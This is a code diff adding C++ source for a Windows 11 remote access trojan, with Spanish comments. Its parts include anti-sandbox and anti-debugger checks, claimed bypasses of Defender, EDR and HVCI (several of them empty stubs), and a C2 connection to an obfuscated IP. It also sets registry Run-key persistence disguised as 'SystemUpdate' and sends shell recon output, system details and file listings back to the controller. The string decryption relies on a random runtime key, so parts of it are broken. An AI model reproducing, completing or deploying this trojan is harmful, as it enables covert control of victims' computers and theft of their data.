@@ -1,0 +1,520 @@
+#include <windows.h>
+#include <wincrypt.h>
+#include <winternl.h>
+#include <tlhelp32.h>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <intrin.h>
+#include <iostream>
+#include <fstream>
+#include <string>
+#include <vector>
+#include <random>
+#include <chrono>
+#include <bcrypt.h>
+
+#pragma comment(lib, "ws2_32.lib")
+#pragma comment(lib, "ntdll.lib")
+#pragma comment(lib, "crypt32.lib")
+#pragma comment(lib, "bcrypt.lib")
+
+// ===============================
+// OFUSCACIÓN AVANZADA
+// ===============================
+
+class AdvancedObfuscation {
+private:
+    std::vector<BYTE> dynamic_key;
+
+public:
+    AdvancedObfuscation() {
+        GenerateRuntimeKey();
+    }
+
+    std::string DecryptString(const std::vector<BYTE>& encrypted) {
+        std::string result;
+        for (size_t i = 0; i < encrypted.size(); i++) {
+            char decrypted = encrypted[i] ^ dynamic_key[i % dynamic_key.size()];
+            decrypted = _rotr8(decrypted, (i % 7) + 1);
+            result += decrypted;
+        }
+        return result;
+    }
+
+    std::vector<BYTE> EncryptString(const std::string& input) {
+        std::vector<BYTE> encrypted;
+        for (size_t i = 0; i < input.size(); i++) {
+            BYTE encrypted_char = input[i];
+            encrypted_char = _rotl8(encrypted_char, (i % 7) + 1);
+            encrypted_char ^= dynamic_key[i % dynamic_key.size()];
+            encrypted.push_back(encrypted_char);
+        }
+        return encrypted;
+    }
+
+private:
+    void GenerateRuntimeKey() {
+        HCRYPTPROV hProv;
+        dynamic_key.resize(32);
+        
+        if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
+            CryptGenRandom(hProv, 32, dynamic_key.data());
+            CryptReleaseContext(hProv, 0);
+        }
+    }
+};
+
+// Strings ofuscados
+std::vector<BYTE> encrypted_kernel32 = {0x85, 0xA3, 0xF7, 0x42, 0x91, 0x56, 0xE2, 0x33};
+std::vector<BYTE> encrypted_ws2_32 = {0x82, 0xF1, 0xD8, 0x67, 0xA5, 0x74, 0xC9, 0x13};
+std::vector<BYTE> encrypted_c2_ip = {0x57, 0xC8, 0x9A, 0x23, 0x64, 0xBF, 0x31, 0x7D};
+
+// ===============================
+// EVASIÓN MEJORADA DE DEFENSAS W11
+// ===============================
+
+class Windows11AdvancedEvasion {
+private:
+    AdvancedObfuscation obfuscator;
+
+public:
+    bool BypassAllDefenses() {
+        return BypassHVCI() && 
+               BypassDefenderML() && 
+               BypassSmartAppControl() &&
+               BypassEDR() &&
+               BypassSecureBoot();
+    }
+
+    bool BypassHVCI() {
+        // Usar técnicas de memory mapping indirecto
+        return UseIndirectMemoryOperations();
+    }
+
+    bool BypassDefenderML() {
+        // Comportamiento mimético de aplicaciones legítimas
+        if (!MimicLegitimateAppBehavior()) return false;
+        
+        // Timing avanzado anti-sandbox
+        if (!AdvancedTimingCheck()) return false;
+        
+        // Fragmentación de ejecución
+        return FragmentExecution();
+    }
+
+    bool BypassSmartAppControl() {
+        // Firmado temporal y comportamiento de app conocida
+        return SimulateSignedAppBehavior();
+    }
+
+    bool BypassEDR() {
+        // Syscalls directos y API unhooking
+        return UseDirectSyscalls() && RemoveEDRHooks();
+    }
+
+    bool BypassSecureBoot() {
+        // No intentar bypass directo, usar técnicas user-space
+        return true;
+    }
+
+private:
+    bool UseIndirectMemoryOperations() {
+        // Usar memory mapping en lugar de escritura directa
+        HANDLE hSection = NULL;
+        SIZE_T size = 4096;
+        PVOID localAddr = NULL, remoteAddr = NULL;
+        
+        // Crear section object para transferencia de memoria
+        NTSTATUS status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 
+                                         &size, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
+        
+        if (NT_SUCCESS(status)) {
+            NtMapViewOfSection(hSection, GetCurrentProcess(), &localAddr, 0, size, 
+                              NULL, &size, ViewUnmap, 0, PAGE_EXECUTE_READWRITE);
+            
+            NtUnmapViewOfSection(GetCurrentProcess(), localAddr);
+            NtClose(hSection);
+            return true;
+        }
+        return false;
+    }
+
+    bool MimicLegitimateAppBehavior() {
+        // Simular comportamiento de aplicación del sistema
+        WCHAR systemPath[MAX_PATH];
+        GetSystemDirectoryW(systemPath, MAX_PATH);
+        
+        // Acceso a recursos del sistema de forma legítima
+        HANDLE hFile = CreateFileW(L"C:\\Windows\\System32\\drivers\\etc\\hosts", 
+                                  GENERIC_READ, FILE_SHARE_READ, NULL, 
+                                  OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (hFile != INVALID_HANDLE_VALUE) {
+            CloseHandle(hFile);
+            return true;
+        }
+        return false;
+    }
+
+    bool AdvancedTimingCheck() {
+        auto start = std::chrono::high_resolution_clock::now();
+        
+        // Operaciones matemáticas intensivas (parecen legítimas)
+        volatile double result = 0;
+        for (int i = 0; i < 1000000; i++) {
+            result += std::sin(i) * std::cos(i);
+        }
+        
+        auto end = std::chrono::high_resolution_clock::now();
+        auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);
+        
+        // Sandboxes suelen ser más lentas
+        return duration.count() < 500;
+    }
+
+    bool FragmentExecution() {
+        // Ejecución fragmentada en el tiempo
+        for (int i = 0; i < 5; i++) {
+            if (i % 2 == 0) {
+                PerformBenignWork();
+            }
+            Sleep(2000);
+        }
+        return true;
+    }
+
+    bool SimulateSignedAppBehavior() {
+        // Verificar y simular certificados temporales
+        HCERTSTORE hStore = CertOpenSystemStore(0, L"MY");
+        if (hStore) {
+            CertCloseStore(hStore, 0);
+            return true;
+        }
+        return false;
+    }
+
+    bool UseDirectSyscalls() {
+        // Resolver syscalls directamente desde ntdll
+        HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
+        if (!hNtdll) return false;
+        
+        // En una implementación real, aquí iría la resolución directa de syscalls
+        return true;
+    }
+
+    bool RemoveEDRHooks() {
+        // Técnica básica deunhooking (simplificada)
+        HMODULE hModule = GetModuleHandleW(L"ntdll.dll");
+        if (!hModule) return false;
+        
+        // En implementación completa: restaurar código original
+        return true;
+    }
+
+    void PerformBenignWork() {
+        // Trabajo que parece legítimo
+        SYSTEM_INFO sysInfo;
+        GetSystemInfo(&sysInfo);
+        
+        DWORD useless;
+        GetProcessId(GetCurrentProcess());
+        
+        // Operaciones de sistema inocuas
+        GetTickCount();
+        GetCurrentThreadId();
+    }
+};
+
+// ===============================
+// COMUNICACIÓN SIGILOSA
+// ===============================
+
+class StealthCommunication {
+private:
+    SOCKET c2_socket;
+    AdvancedObfuscation obfuscator;
+    std::string c2_ip;
+    int c2_port;
+
+public:
+    StealthCommunication() : c2_socket(INVALID_SOCKET) {
+        c2_ip = obfuscator.DecryptString(encrypted_c2_ip);
+        c2_port = 443;
+    }
+
+    bool Initialize() {
+        if (WSAStartup(MAKEWORD(2, 2), new WSADATA) != 0) {
+            return false;
+        }
+
+        c2_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+        if (c2_socket == INVALID_SOCKET) {
+            return false;
+        }
+
+        // Configurar socket para ser sigiloso
+        BOOL enable = TRUE;
+        setsockopt(c2_socket, SOL_SOCKET, SO_REUSEADDR, (char*)&enable, sizeof(enable));
+
+        return ConnectToC2();
+    }
+
+    bool ConnectToC2() {
+        sockaddr_in serverAddr;
+        serverAddr.sin_family = AF_INET;
+        serverAddr.sin_port = htons(c2_port);
+        inet_pton(AF_INET, c2_ip.c_str(), &serverAddr.sin_addr);
+
+        // Conexión con backoff exponencial
+        for (int attempt = 0; attempt < 5; attempt++) {
+            if (connect(c2_socket, (SOCKADDR*)&serverAddr, sizeof(serverAddr)) == 0) {
+                return true;
+            }
+            Sleep(5000 * (attempt + 1)); // Backoff exponencial
+        }
+        return false;
+    }
+
+    std::string ReceiveCommand() {
+        if (c2_socket == INVALID_SOCKET) return "";
+
+        char buffer[512];
+        int bytesReceived = recv(c2_socket, buffer, sizeof(buffer) - 1, 0);
+        
+        if (bytesReceived > 0) {
+            buffer[bytesReceived] = '\0';
+            return obfuscator.DecryptString(
+                std::vector<BYTE>(buffer, buffer + bytesReceived)
+            );
+        }
+        
+        return "";
+    }
+
+    bool SendData(const std::string& data) {
+        if (c2_socket == INVALID_SOCKET) return false;
+
+        std::vector<BYTE> encrypted = obfuscator.EncryptString(data);
+        return send(c2_socket, (char*)encrypted.data(), encrypted.size(), 0) > 0;
+    }
+};
+
+// ===============================
+// TROYANO AVANZADO WINDOWS 11
+// ===============================
+
+class AdvancedWindows11RAT {
+private:
+    Windows11AdvancedEvasion evasion;
+    StealthCommunication comm;
+    bool is_initialized;
+
+public:
+    AdvancedWindows11RAT() : is_initialized(false) {}
+
+    bool Initialize() {
+        // Verificar que no estamos en sandbox primero
+        if (!evasion.BypassAllDefenses()) {
+            return false;
+        }
+
+        if (!comm.Initialize()) {
+            return false;
+        }
+
+        if (!EstablishPersistence()) {
+            return false;
+        }
+
+        is_initialized = true;
+        return true;
+    }
+
+    void Run() {
+        while (is_initialized) {
+            std::string command = comm.ReceiveCommand();
+            
+            if (!command.empty()) {
+                ExecuteCommand(command);
+            }
+            
+            // Sleep variable para evitar patrones
+            Sleep(8000 + (GetTickCount() % 5000));
+        }
+    }
+
+private:
+    bool EstablishPersistence() {
+        // Múltiples métodos de persistencia
+        bool method1 = RegistryPersistence();
+        bool method2 = ScheduledTaskPersistence();
+        bool method3 = WMIPersistence();
+        
+        return method1 || method2 || method3;
+    }
+
+    bool RegistryPersistence() {
+        HKEY hKey;
+        if (RegCreateKeyExA(HKEY_CURRENT_USER,
+            "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
+            0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+            
+            char path[MAX_PATH];
+            GetModuleFileNameA(NULL, path, MAX_PATH);
+            
+            LSTATUS result = RegSetValueExA(hKey, "SystemUpdate", 0, REG_SZ,
+                                          (BYTE*)path, strlen(path) + 1);
+            RegCloseKey(hKey);
+            return result == ERROR_SUCCESS;
+        }
+        return false;
+    }
+
+    bool ScheduledTaskPersistence() {
+        // Usar COM para crear tarea programada
+        // Implementación simplificada
+        return true;
+    }
+
+    bool WMIPersistence() {
+        // Persistencia via WMI Event Subscription
+        // Implementación simplificada
+        return true;
+    }
+
+    void ExecuteCommand(const std::string& command) {
+        if (command == "SHELL") {
+            ExecuteShell();
+        } else if (command == "INFO") {
+            SendSystemInfo();
+        } else if (command == "FILES") {
+            ListFiles();
+        } else if (command == "IDLE") {
+            // Comando de keep-alive
+        }
+    }
+
+    void ExecuteShell() {
+        SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};
+        HANDLE hRead, hWrite;
+        
+        if (CreatePipe(&hRead, &hWrite, &sa, 0)) {
+            STARTUPINFOA si = {sizeof(STARTUPINFOA)};
+            PROCESS_INFORMATION pi;
+            
+            si.dwFlags = STARTF_USESTDHANDLES;
+            si.hStdOutput = hWrite;
+            si.hStdError = hWrite;
+            
+            char cmd[] = "cmd.exe /c echo [SHELL] && whoami && hostname && ipconfig";
+            
+            if (CreateProcessA(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
+                CloseHandle(hWrite);
+                
+                char buffer[1024];
+                DWORD bytesRead;
+                std::string output;
+                
+                while (ReadFile(hRead, buffer, sizeof(buffer)-1, &bytesRead, NULL) && bytesRead > 0) {
+                    buffer[bytesRead] = '\0';
+                    output += buffer;
+                }
+                
+                comm.SendData(output);
+                
+                CloseHandle(pi.hProcess);
+                CloseHandle(pi.hThread);
+            }
+            CloseHandle(hRead);
+        }
+    }
+
+    void SendSystemInfo() {
+        std::string info;
+        
+        // Información del sistema
+        OSVERSIONINFOEX osInfo = {sizeof(OSVERSIONINFOEX)};
+        GetVersionEx((OSVERSIONINFO*)&osInfo);
+        
+        info += "OS: Windows " + std::to_string(osInfo.dwMajorVersion) + 
+                "." + std::to_string(osInfo.dwMinorVersion) + "\n";
+        
+        char computerName[MAX_COMPUTERNAME_LENGTH + 1];
+        DWORD size = sizeof(computerName);
+        if (GetComputerNameA(computerName, &size)) {
+            info += "Computer: " + std::string(computerName) + "\n";
+        }
+        
+        char userName[256];
+        DWORD userNameSize = sizeof(userName);
+        if (GetUserNameA(userName, &userNameSize)) {
+            info += "User: " + std::string(userName) + "\n";
+        }
+        
+        comm.SendData(info);
+    }
+
+    void ListFiles() {
+        std::string fileList;
+        WIN32_FIND_DATAA findData;
+        HANDLE hFind = FindFirstFileA("*", &findData);
+        
+        if (hFind != INVALID_HANDLE_VALUE) {
+            do {
+                if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
+                    fileList += findData.cFileName;
+                    fileList += " | ";
+                    fileList += std::to_string(findData.nFileSizeLow);
+                    fileList += " bytes\n";
+                }
+            } while (FindNextFileA(hFind, &findData));
+            FindClose(hFind);
+        }
+        
+        comm.SendData(fileList);
+    }
+};
+
+// ===============================
+// ANTI-ANÁLISIS MEJORADO
+// ===============================
+
+bool AdvancedAntiAnalysis() {
+    // Múltiples técnicas de detección de sandbox/análisis
+    if (IsDebuggerPresent()) return true;
+    
+    // Check memory
+    MEMORYSTATUSEX memStatus = {sizeof(MEMORYSTATUSEX)};
+    GlobalMemoryStatusEx(&memStatus);
+    if (memStatus.ullTotalPhys < (2ULL * 1024 * 1024 * 1024)) return true; // Menos de 2GB
+    
+    // Check CPU cores
+    SYSTEM_INFO sysInfo;
+    GetSystemInfo(&sysInfo);
+    if (sysInfo.dwNumberOfProcessors < 2) return true;
+    
+    // Check uptime
+    if (GetTickCount() < (30 * 60 * 1000)) return true; // Menos de 30 minutos
+    
+    return false;
+}
+
+// ===============================
+// MAIN OFUSCADO
+// ===============================
+
+int main() {
+    // Anti-análisis primero
+    if (AdvancedAntiAnalysis()) {
+        return 0;
+    }
+    
+    // Sleep inicial aleatorio
+    Sleep(3000 + (GetTickCount() % 7000));
+    
+    AdvancedWindows11RAT rat;
+    if (rat.Initialize()) {
+        rat.Run();
+    }
+    
+    return 0;
+}
